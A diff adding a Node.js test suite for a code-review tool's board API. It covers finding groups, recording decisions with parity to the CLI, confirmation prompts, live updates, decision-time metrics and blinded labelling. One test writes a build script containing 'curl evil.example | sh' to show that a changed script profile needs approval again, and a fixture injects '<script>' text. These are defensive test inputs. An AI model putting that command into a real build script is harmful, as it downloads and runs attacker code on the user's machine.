@@ -1,0 +1,351 @@
+// The board's API (design 0.1-c §3.3): what each endpoint returns, decide parity with the CLI, live updates, the
+// decision-time metric (§3.5), check-profile approval (§4.3's channel) and label mode (§9.2). Synthetic projects.
+import { test } from 'node:test';
+import assert from 'node:assert/strict';
+import { request } from 'node:http';
+import { readFileSync, writeFileSync, readdirSync, mkdirSync } from 'node:fs';
+import { join } from 'node:path';
+import { execFile } from 'node:child_process';
+import { fileURLToPath } from 'node:url';
+import { startBoard } from '../src/board/server.mjs';
+import { DecisionClock, CAP_MS, IDLE_MS } from '../src/board/shared.mjs';
+import * as L from '../src/ledger.mjs';
+import * as P from '../src/project.mjs';
+import { readMetrics, decisionTimes, metricsPath } from '../src/metrics.mjs';
+import { smallProject, withAi, writeRun, HOSTILE } from './fixtures/board-project.mjs';
+
+const CLI = fileURLToPath(new URL('../src/cli.mjs', import.meta.url));
+const cli = (cwd, ...a) => new Promise(res => execFile('node', [CLI, ...a], { cwd, encoding: 'utf8' }, (err, stdout, stderr) => res({ code: err ? err.code : 0, stdout, stderr })));
+
+async function board(p, opts = {}) {
+  const b = await startBoard({ projectDir: p.root, ...opts });
+  const origin = b.origin;
+  const r = await fetch(`${origin}/api/session`, { method: 'POST', headers: { 'content-type': 'application/json', origin }, body: JSON.stringify({ code: b.newLink().split('#t=')[1] }) });
+  const s = await r.json();
+  const call = async (path, body) => {
+    const res = await fetch(origin + path, body === undefined ? { headers: { 'x-nunchi-token': s.token } }
+      : { method: 'POST', headers: { 'x-nunchi-token': s.token, 'content-type': 'application/json', origin }, body: JSON.stringify(body) });
+    let json = null; try { json = await res.json(); } catch {}
+    return { status: res.status, json };
+  };
+  return { b, call, session: s, token: s.token };
+}
+const decisions = nunchi => { try { return readdirSync(join(nunchi, 'decisions'), { recursive: true }).map(String).filter(f => f.endsWith('.json')).map(f => JSON.parse(readFileSync(join(nunchi, 'decisions', f), 'utf8'))); } catch { return []; } };
+const gid = (p, rule) => p.findings.find(f => f.rule === rule).group;
+// a project with AI findings: one claimed (not double-checked), one confirmed, grounded in a file of the app
+function aiProject() {
+  const p = smallProject();
+  const ai = withAi(p, [
+    { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[3], selector: 'main p.err', box: [40, 300, 400, 24], claim: `The error says nothing useful ${HOSTILE}`, status: 'claimed', severity: 'high', file: 'app/garden/page.tsx', line: 12 },
+    { lens: 'L2', rule: 'L2.inconsistent-term', scene: p.scenes[0], selector: 'main > a.more', box: [40, 900, 120, 32], claim: 'Two words for one thing', status: 'confirmed', severity: 'medium', file: '../../outside.tsx', line: 3 },
+  ]);
+  return { ...p, ai };
+}
+
+test('api: /api/summary is the summary findings --json carries (one function)', async () => {
+  const p = smallProject();
+  const { b, call } = await board(p);
+  try {
+    const s = (await call('/api/summary')).json;
+    const f = JSON.parse((await cli(p.root, 'findings', '--json')).stdout).summary;
+    for (const k of ['verdict', 'bySeverity', 'byStatus', 'toDecide', 'toFix', 'handoff', 'since', 'running', 'fullCheck']) assert.deepEqual(s[k], f[k], k);
+    assert.equal(s.verdict.text, 'Not yet · 1 blocker, 1 high: 2 to decide');
+    assert.deepEqual(s.health.scenes, { total: 5, checked: 4, notSeen: 1, reasons: ['timeout'] });
+    assert.equal(s.mode, 'board');
+    assert.deepEqual(s.counts, { groups: 4, screens: 5 });
+  } finally { await b.close(); }
+});
+
+test('api: /api/groups filters by status, lens and a plain substring, sections by kind, file, screen or lens; AI not double-checked apart', async () => {
+  const p = aiProject();
+  const { b, call } = await board(p);
+  try {
+    const all = (await call('/api/groups?status=all')).json;
+    assert.equal(Object.keys(all.groups).length, 6, 'every group is in the map');
+    assert.deepEqual(all.unchecked.flatMap(s => s.ids), [p.ai.find(i => i.verification.status === 'claimed').group], 'the claimed AI group sits apart');
+    assert.ok(all.sections.flatMap(s => s.ids).includes(p.ai.find(i => i.verification.status === 'confirmed').group));
+    assert.equal(all.sections[0].severity, 'blocker', 'worst first');
+    const l3 = (await call('/api/groups?status=all&lens=L3')).json;
+    assert.deepEqual(l3.sections.flatMap(s => s.ids), [gid(p, 'dead-href')]);
+    const q = (await call(`/api/groups?status=all&q=${encodeURIComponent('typeerror')}`)).json;
+    assert.deepEqual(q.sections.flatMap(s => s.ids), [gid(p, 'raw-error-text')], 'a plain, case-blind substring');
+    const regex = (await call(`/api/groups?status=all&q=${encodeURIComponent('.*')}`)).json;
+    assert.equal(regex.total, 0, 'no regular expressions');
+    const byFile = (await call('/api/groups?status=all&group=file')).json;
+    assert.ok(byFile.sections.some(s => s.title === 'app/garden/page.tsx') || byFile.unchecked.some(s => s.title === 'app/garden/page.tsx'));
+    assert.ok(byFile.sections.some(s => s.title === 'No file known (found on a screen)'));
+    const byLens = (await call('/api/groups?status=all&group=lens')).json;
+    assert.ok(byLens.sections.some(s => /^L9 · ./.test(s.title)), 'lens sections carry the lens name');
+    assert.ok(byLens.sections.some(s => s.title === 'L3'), 'a lens with no pack (a computed lens) by its id');
+    const byScreen = (await call('/api/groups?status=all&group=screen')).json;
+    assert.ok(byScreen.sections.some(s => s.title === 'Browser bundle'));
+    // default order: severity, then reach
+    const open = (await call('/api/groups')).json;
+    assert.equal(open.status, 'open');
+    const order = open.sections.flatMap(s => s.ids).map(id => open.groups[id].severity);
+    const SEV = ['blocker', 'high', 'medium', 'low'];
+    assert.deepEqual(order, [...order].sort((a, b) => SEV.indexOf(a) - SEV.indexOf(b)));
+    assert.equal(open.groups[gid(p, 'dead-href')].screens, 3, 'reach: three screens');
+  } finally { await b.close(); }
+});
+
+test('api: /api/groups/:id gives instances, screens with evidence addresses, history and an editor link only inside the project', async () => {
+  const p = aiProject();
+  const { b, call } = await board(p);
+  try {
+    const dead = (await call(`/api/groups/${gid(p, 'dead-href')}`)).json;
+    assert.equal(dead.instances.length, 3);
+    const sk = dead.instances[0].scene;
+    assert.match(sk, /^0001\//);
+    assert.match(dead.scenes[sk].img.url, /^\/evidence\/0001\/[^/]+\/full\.jpg$/);
+    assert.equal(dead.instances[0].drawable.ok, true, 'the box comes from the scene\'s evidence index');
+    assert.equal((await call(dead.scenes[sk].img.url)).status, 200);
+    const claimed = p.ai.find(i => i.verification.status === 'claimed'), confirmed = p.ai.find(i => i.verification.status === 'confirmed');
+    const a = (await call(`/api/groups/${claimed.group}`)).json;
+    assert.match(a.code.link, /^vscode:\/\/file\/.+\/app\/garden\/page\.tsx:12$/);
+    assert.equal(a.headline.includes('<script>'), true, 'app text is data, sent as it is (redacted, never parsed)');
+    assert.equal(a.checked, false);
+    const c = (await call(`/api/groups/${confirmed.group}`)).json;
+    assert.equal(c.code.link, null, 'a file outside the project gets no link');
+    assert.equal((await call('/api/groups/000000000000')).status, 404);
+    // history: how each decision was made
+    await cli(p.root, 'decide', gid(p, 'dead-href'), 'keep', '--reason', 'intended');
+    const after = (await call(`/api/groups/${gid(p, 'dead-href')}`)).json;
+    assert.deepEqual(after.history.map(h => [h.decision, h.channel, h.channelText]), [['keep', 'cli-agent', 'Recorded by your AI']]);
+  } finally { await b.close(); }
+});
+
+test('api: /api/screens gives every screen of the latest run with its badge and numbered findings', async () => {
+  const p = smallProject();
+  const { b, call } = await board(p);
+  try {
+    const w = (await call('/api/screens')).json;
+    assert.equal(w.run, '0001');
+    assert.equal(w.scenes.length, 5);
+    const lost = w.scenes.find(s => s.route === '/lost');
+    assert.deepEqual([lost.badge, lost.kind, lost.img], ['Not seen', 'dark', null]);
+    const home = w.scenes.find(s => s.id === '~.guest.normal.d');
+    assert.equal(home.badge, '1 medium · 1 low');
+    assert.deepEqual(home.findings.map(f => f.n), [1, 2]);
+  } finally { await b.close(); }
+});
+
+test('api: /api/decide records through the ledger functions with channel board; confirmations for blockers, L9, >10 groups and unchecked AI fixes', async () => {
+  const p = aiProject();
+  const { b, call } = await board(p);
+  try {
+    const one = await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'keep', reason: 'intended', ms: 3000 });
+    assert.equal(one.status, 200, JSON.stringify(one.json));
+    assert.deepEqual([one.json.decided, one.json.batch], ['Kept (intended)', null]);
+    const files = decisions(p.nunchi);
+    assert.deepEqual([files[0].channel, files[0].decision, files[0].reason, files[0].batch], ['board', 'keep', 'intended', undefined]);
+    const ap = JSON.parse(readFileSync(join(p.nunchi, 'state', 'approved.json'), 'utf8'));
+    assert.equal(ap.channels[L.approvalKey(files[0])], 'board');
+    // a blocker or an L9 dismissal asks first
+    const secret = await call('/api/decide', { targets: [gid(p, 'secret-in-client-bundle')], decision: 'false-positive', reason: 'not-a-problem' });
+    assert.equal(secret.status, 409);
+    assert.equal(secret.json.confirm.text, 'Mark 1 group Not a problem? 1 is a blocker, 1 is a safety or secret finding.');
+    assert.equal(decisions(p.nunchi).length, 1, 'nothing written before the answer');
+    assert.equal((await call('/api/decide', { targets: [gid(p, 'secret-in-client-bundle')], decision: 'false-positive', reason: 'not-a-problem', confirmed: true })).status, 200);
+    // fixing a claim nobody double-checked asks first
+    const claimed = p.ai.find(i => i.verification.status === 'claimed');
+    const fix = await call('/api/decide', { targets: [claimed.group], decision: 'fix', reason: null });
+    assert.deepEqual([fix.status, fix.json.confirm?.text], [409, 'This hasn’t been double-checked. Fix anyway?']);
+    // a batch: one file per group, one batch id
+    const batch = await call('/api/decide', { targets: [gid(p, 'raw-error-text'), gid(p, 'target-size-min')], decision: 'hold', reason: null, ms: 9000 });
+    assert.equal(batch.status, 200);
+    assert.match(batch.json.batch, /^[\w-]+$/);
+    assert.equal(decisions(p.nunchi).filter(d => d.batch === batch.json.batch).length, 2);
+    // undo (Z) writes reopen
+    assert.equal((await call('/api/decide', { targets: [gid(p, 'raw-error-text'), gid(p, 'target-size-min')], decision: 'reopen', reason: null, confirmed: true })).status, 200);
+    const led = P.loadLedger(p.nunchi, { root: p.root });
+    const st = id => P.ledgerView(led).groups.find(g => g.group === id).status;
+    assert.deepEqual([st(gid(p, 'raw-error-text')), st(gid(p, 'dead-href')), st(gid(p, 'secret-in-client-bundle'))], ['open', 'kept', 'dismissed']);
+  } finally { await b.close(); }
+});
+
+test('api: /api/decide validates everything it is sent, and refuses a group that is gone', async () => {
+  const p = smallProject();
+  const { b, call } = await board(p);
+  try {
+    const g = gid(p, 'dead-href');
+    for (const [body, status] of [
+      [{ targets: [], decision: 'fix', reason: null }, 400], [{ targets: ['x'], decision: 'fix', reason: null }, 400], [{ targets: [g, g], decision: 'fix', reason: null }, 400],
+      [{ targets: [g], decision: 'delete', reason: null }, 400], [{ targets: [g], decision: 'keep', reason: null }, 400], [{ targets: [g], decision: 'keep', reason: 'because' }, 400],
+      [{ targets: [g], decision: 'fix', reason: 'intended' }, 400], [{ targets: [g], decision: 'fix', reason: null, note: 'x'.repeat(501) }, 400],
+      [{ targets: [g], decision: 'fix', reason: null, ms: -1 }, 400], [{ targets: [g], decision: 'fix', reason: null, ms: CAP_MS + 1 }, 400],
+      [{ targets: ['abcdefabcdef'], decision: 'fix', reason: null }, 409],
+    ]) assert.equal((await call('/api/decide', body)).status, status, JSON.stringify(body));
+    assert.equal(decisions(p.nunchi).length, 0);
+    // more than 10 groups dismissed at once asks first
+    const many = smallProject();
+    writeRun(many.root, '0002', { parent: '0001', scenes: many.scenes, findings: Array.from({ length: 11 }, (_, i) => ({ lens: 'L8', rule: 'target-size-min', severity: 'low', scene: many.scenes[0].id, route: '/', viewport: 'd', selector: `nav a.l${'x'.repeat(i + 1)}`, box: null, evidence: {} })) });
+    const m = await board(many);
+    try {
+      const ids = Object.values((await m.call('/api/groups?status=all')).json.groups).filter(x => x.rule === 'target-size-min' && x.status === 'open').map(x => x.id);
+      assert.ok(ids.length > 10, String(ids.length));
+      const r = await m.call('/api/decide', { targets: ids, decision: 'false-positive', reason: 'not-a-problem' });
+      assert.equal(r.status, 409);
+      assert.match(r.json.confirm.text, new RegExp(`^Mark ${ids.length} groups Not a problem\\?`));
+    } finally { await m.b.close(); }
+  } finally { await b.close(); }
+});
+
+test('decide parity: the board and nunchi decide write the same decision through the same functions; only who-and-how differ', async () => {
+  const one = smallProject(), two = smallProject();
+  const g = gid(one, 'raw-error-text');
+  assert.equal(g, gid(two, 'raw-error-text'), 'the same project twice');
+  assert.equal((await cli(one.root, 'decide', g, 'keep', '--reason', 'intended', '--note', 'copy is final')).code, 0);
+  const { b, call } = await board(two);
+  try { assert.equal((await call('/api/decide', { targets: [g], decision: 'keep', reason: 'intended', note: 'copy is final' })).status, 200); }
+  finally { await b.close(); }
+  const [a] = decisions(one.nunchi), [c] = decisions(two.nunchi);
+  const strip = ({ id, at, channel, by, batch, ...rest }) => rest;
+  assert.deepEqual(strip(a), strip(c));
+  assert.deepEqual([a.channel, c.channel], ['cli-agent', 'board']);
+  for (const p of [one, two]) {
+    const led = P.loadLedger(p.nunchi, { root: p.root });
+    const row = P.ledgerView(led).rows.find(r => r.group === g);
+    assert.deepEqual([row.status, row.decision.decision, row.decision.reason, row.decision.verified], ['kept', 'keep', 'intended', true]);
+  }
+  const human = p => P.ledgerView(P.loadLedger(p.nunchi, { root: p.root })).rows.find(r => r.group === g).decision.human;
+  assert.deepEqual([human(one), human(two)], [false, true], 'the agent\'s dismissal waits for the person; the board\'s is the person\'s');
+  // and the same file layout: folder = target, name = id
+  for (const p of [one, two]) assert.equal(readdirSync(join(p.nunchi, 'decisions')).join(), `group-${g}`);
+});
+
+test('api: /api/confirm confirms the dismissals the agent recorded, in one batch; a stale list is refused', async () => {
+  const p = smallProject();
+  await cli(p.root, 'decide', gid(p, 'raw-error-text'), 'keep', '--reason', 'intended');
+  const { b, call } = await board(p);
+  try {
+    const s = (await call('/api/summary')).json;
+    assert.equal(s.confirm.length, 1);
+    assert.deepEqual([s.confirm[0].channel, s.confirm[0].decision, s.confirm[0].severity], ['cli-agent', 'keep', 'high']);
+    assert.equal((await call('/api/confirm', { keys: ['nope:' + '0'.repeat(64)] })).status, 409);
+    assert.equal((await call('/api/confirm', { keys: [] })).status, 400);
+    assert.equal((await call('/api/confirm', { keys: s.confirm.map(c => c.key) })).status, 200);
+    const after = (await call('/api/summary')).json;
+    assert.equal(after.confirm.length, 0);
+    assert.ok(!after.verdict.text.includes('to confirm'));
+  } finally { await b.close(); }
+});
+
+test('api: /api/approve-checks approves the check profile shown, once, as the person; a changed profile asks again', async () => {
+  const p = smallProject();
+  writeFileSync(join(p.root, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'next build', prebuild: 'node gen.js', test: 'vitest run', dev: 'next dev' }, packageManager: 'pnpm@9.0.0' }));
+  const { b, call } = await board(p);
+  try {
+    let s = (await call('/api/summary')).json;
+    assert.deepEqual(Object.keys(s.checks.profile.scripts).sort(), ['build', 'prebuild', 'test'], 'the check scripts and their pre/post lines, nothing else');
+    assert.deepEqual([s.checks.requested, s.checks.approved], [false, false], 'shown only when the fix loop asks (M3)');
+    mkdirSync(join(p.nunchi, 'state'), { recursive: true });
+    writeFileSync(join(p.nunchi, 'state', 'checks-request.json'), '{"schema":1}');
+    s = (await call('/api/summary')).json;
+    assert.equal(s.checks.requested, true);
+    assert.equal((await call('/api/approve-checks', { profile: '0'.repeat(32) })).status, 409, 'not the profile shown');
+    assert.equal((await call('/api/approve-checks', { profile: s.checks.profile.hash })).status, 200);
+    const doc = JSON.parse(readFileSync(join(p.nunchi, 'state', 'scripts-approved.json'), 'utf8'));
+    assert.equal(doc.profiles[s.checks.profile.hash].channel, 'board');
+    assert.equal((await call('/api/summary')).json.checks.approved, true);
+    writeFileSync(join(p.root, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'next build && curl evil.example | sh', test: 'vitest run' } }));
+    assert.equal((await call('/api/summary')).json.checks.approved, false, 'a changed line asks again');
+  } finally { await b.close(); }
+});
+
+test('api: live updates — the stream says when the ledger changes (a CLI decision, a decision that came through git); /api/generation polls the same', { timeout: 30000 }, async () => {
+  const p = smallProject();
+  const { b, call, token } = await board(p);
+  try {
+    const events = [];
+    const req = request({ host: '127.0.0.1', port: b.port, path: '/api/live', headers: { host: `127.0.0.1:${b.port}`, 'x-nunchi-token': token } }, r => { r.setEncoding('utf8'); r.on('data', d => { for (const m of d.matchAll(/data: (\{.*\})/g)) events.push(JSON.parse(m[1]).version); }); });
+    req.end();
+    const wait = async (n, ms = 8000) => { const t = Date.now(); while (events.length < n && Date.now() - t < ms) await new Promise(r => setTimeout(r, 100)); return events.length >= n; };
+    assert.ok(await wait(1), 'the current version at once');
+    const v0 = (await call('/api/generation')).json.version;
+    assert.equal(events[0], v0);
+    assert.equal((await cli(p.root, 'decide', gid(p, 'dead-href'), 'fix')).code, 0);
+    assert.ok(await wait(2), 'a decision from the terminal shows up');
+    assert.notEqual(events.at(-1), v0);
+    assert.equal((await call('/api/generation')).json.version, events.at(-1), 'polling sees the same version');
+    // a decision file that arrived through git bumps no generation; the decision folders are watched too
+    const d = L.buildDecision({ target: { group: gid(p, 'target-size-min') }, decision: 'hold', by: 'someone else' });
+    L.saveDecision(join(p.nunchi, 'decisions'), d);
+    assert.ok(await wait(3), 'a decision from git shows up');
+    req.destroy();
+  } finally { await b.close(); }
+});
+
+test('decision time (§3.5): kept per decision or batch, Later apart, once per id, stable JSON with no clock; nunchi trust prints it', async () => {
+  const p = smallProject();
+  const { b, call } = await board(p);
+  try {
+    await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'fix', reason: null, ms: 4200 });
+    await call('/api/decide', { targets: [gid(p, 'raw-error-text'), gid(p, 'target-size-min')], decision: 'fix', reason: null, ms: 9000 });
+    await call('/api/decide', { targets: [gid(p, 'raw-error-text')], decision: 'hold', reason: null, ms: 1500 });
+    await call('/api/decide', { targets: [gid(p, 'raw-error-text')], decision: 'reopen', reason: null, ms: 1000, confirmed: true });
+    await call('/api/decide', { targets: [gid(p, 'raw-error-text')], decision: 'fix', reason: null });
+  } finally { await b.close(); }
+  const file = metricsPath(join(p.nunchi, 'state'));
+  const doc = readMetrics(file);
+  assert.deepEqual(Object.values(doc.singles).map(e => e.ms), [4200]);
+  assert.deepEqual(Object.values(doc.batches), [{ ms: 9000, size: 2 }]);
+  assert.deepEqual(Object.values(doc.later).map(e => e.ms), [1500]);
+  const text = readFileSync(file, 'utf8');
+  assert.ok(!/"at"|T\d\d:\d\d/.test(text), 'no time of day, only durations');
+  assert.deepEqual(JSON.parse(text), doc);
+  const t = decisionTimes(doc);
+  assert.deepEqual([t.singles.n, t.singles.median, t.batches.groups, t.later.n], [1, 4200, 2, 1]);
+  const out = await cli(p.root, 'trust');
+  assert.match(out.stdout, /decision time \(board\): singles median 4\.2 s, p90 4\.2 s \(1\)/);
+  assert.match(out.stdout, /batches median 9 s, p90 9 s \(1 batches, 2 groups\)/);
+  assert.match(out.stdout, /later, apart: median 1\.5 s \(1\)/);
+});
+
+test('decision clock (§3.5): paused while the tab is hidden and after 30 s without input; capped at 120 s', () => {
+  const c = new DecisionClock();
+  c.reset('g', 0);
+  assert.equal(c.read(5000), 5000);
+  c.hide(6000); c.show(60000);
+  assert.equal(c.read(61000), 7000, 'hidden time does not count');
+  c.reset('h', 0);
+  assert.equal(c.read(IDLE_MS + 50000), IDLE_MS, 'no input for 30 s: the clock stops at 30 s');
+  c.input(100000);
+  assert.equal(c.read(101000), IDLE_MS + 1000, 'input starts it again');
+  c.reset('i', 0);
+  for (let t = 0; t <= 200000; t += 10000) c.input(t);
+  assert.equal(c.read(200000), CAP_MS, 'capped at 120 s');
+});
+
+test('label mode (§9.2): blinded items from the AI pool, its own keys, labels per labeller, no decisions', async () => {
+  const p = aiProject();
+  const { b, call, session } = await board(p, { mode: 'label', labeller: 'second-labeller' });
+  try {
+    assert.deepEqual([session.mode, session.labeller], ['label', 'second-labeller']);
+    for (const path of ['/api/summary', '/api/groups', '/api/screens']) assert.equal((await call(path)).status, 404, path);
+    assert.equal((await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'fix', reason: null })).status, 404);
+    const pool = (await call('/api/label/pool')).json;
+    assert.equal(pool.total, 2, 'the AI groups only, never rule findings');
+    assert.deepEqual(pool.items.map(i => i.label), [null, null]);
+    const item = (await call(`/api/label/item/${pool.items[0].id}`)).json;
+    for (const hidden of ['source', 'verification', 'severity', 'status', 'statuses', 'decision', 'checked', 'suspect', 'kindTitle', 'history']) assert.ok(!(hidden in item), `${hidden} is hidden`);
+    assert.ok(!JSON.stringify(item).match(/confirmed|claimed|same-model|"high"|"medium"/), 'nothing says how it was verified or how severe it was called');
+    assert.ok(item.lens.definition && item.claim);
+    assert.ok(item.question, 'the checklist question');
+    assert.equal((await call('/api/label', { id: item.id, label: 'maybe' })).status, 400);
+    assert.equal((await call('/api/label', { id: '000000000000', label: 'correct' })).status, 404);
+    assert.equal((await call('/api/label', { id: item.id, label: 'correct' })).status, 200);
+    const file = join(p.nunchi, 'labels', 'second-labeller', `${item.id}.json`);
+    const rec = JSON.parse(readFileSync(file, 'utf8'));
+    assert.deepEqual([rec.label, rec.labeller, rec.channel], ['correct', 'second-labeller', 'board']);
+    assert.equal((await call('/api/label/pool')).json.done, 1);
+    assert.ok(readFileSync(join(p.nunchi, 'state', 'labels-approved.json'), 'utf8').includes(`second-labeller/${item.id}:`));
+  } finally { await b.close(); }
+  // another labeller sees another order (shuffled per labeller, so position says nothing), and none of the first one's labels
+  const other = await board(p, { mode: 'label', labeller: 'owner' });
+  try {
+    const pool = (await other.call('/api/label/pool')).json;
+    assert.equal(pool.done, 0);
+  } finally { await other.b.close(); }
+  await assert.rejects(startBoard({ projectDir: p.root, mode: 'label', labeller: 'Not Valid' }), /labeller/);
+});
